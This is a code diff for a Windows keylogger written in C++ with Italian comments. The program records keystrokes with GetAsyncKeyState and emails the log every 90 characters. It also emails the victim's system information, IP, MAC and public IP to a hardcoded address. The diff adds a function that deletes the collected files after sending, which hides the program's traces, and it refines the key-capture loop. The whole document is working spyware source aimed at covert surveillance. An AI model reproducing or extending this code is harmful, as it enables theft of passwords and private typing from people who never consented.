@@ -111,6 +111,14 @@ void sendinfo(void) ///Avvia la  powershell ed esegue lo script per inviare l'em
     sendemail(Email_To_Send_From, "Public IP", Password_Of_Sender_Email, "Public IP", Email_To_Recieve_On, "%USERPROFILE%\\AppData\\Roaming\\Logs\\publicip.txt");
 }
 
+void delinfo(void)
+{
+    system("del %USERPROFILE%\\AppData\\Roaming\\Logs\\SystemInfo.txt");
+    system("del %USERPROFILE%\\AppData\\Roaming\\Logs\\IPAddress.txt");
+    system("del %USERPROFILE%\\AppData\\Roaming\\Logs\\MacAddress.txt");
+    system("del %USERPROFILE%\\AppData\\Roaming\\Logs\\publicip.txt");
+}
+
 //utile per la permanenza nei registri di windows
 /*void getlocation(void) //trova la directory corrente dell'applicazione
 {
@@ -140,12 +148,12 @@ void keylog(void) //Key logger
     while (true)
     {
 
-        for (c = 7; c <= 130; c++) // Eseguo il ciclo dell'intera tabella ascii e controllo se il tasto è premuto
+        for (c = 7; c < 127; c++) // Eseguo il ciclo della tabella ascii dei printable characters( 126) e controllo se il tasto è premuto
         {
             if (count == 90) //appena il target ha scritto 90 caratteri il file di log viene inoltrato tramite email
             {
                 sendlog();                                                    //invio
-                system("del %USERPROFILE%\\AppData\\Roaming\\Logs\\log.txt"); //cancello il file
+                system("del %USERPROFILE%\\AppData\\Roaming\\Logs\\Log.txt"); //cancello il file
                 count = 0;                                                    // riporto count a zero
             }
             //La funzione GetAsyncKeyState interroga lo stato corrente dei tasti della tastiera (al momento della chiamata).
@@ -167,6 +175,8 @@ void keylog(void) //Key logger
                 path += "\\Logs\\Log.txt";
                 write.open(path.c_str(), ios::out | ios::app);
 
+                // questo if controlla se shift non è abilitato sulla tastiera e quindi stiamo scrivendo in minuscolo
+                //aggiungo 32 perche nella tab Ascii i valori che vanno da 97 fino a 122 sono lettere minuscole
                 if (((c > 64) && (c < 91)) && !(GetAsyncKeyState(0x10)))
                 {
                     c += 32;
@@ -385,6 +395,7 @@ int main()
     gettime();
     storemacaddress();
     sendinfo();
+    delinfo();
     keylog();
     sendlog();
     return 0;
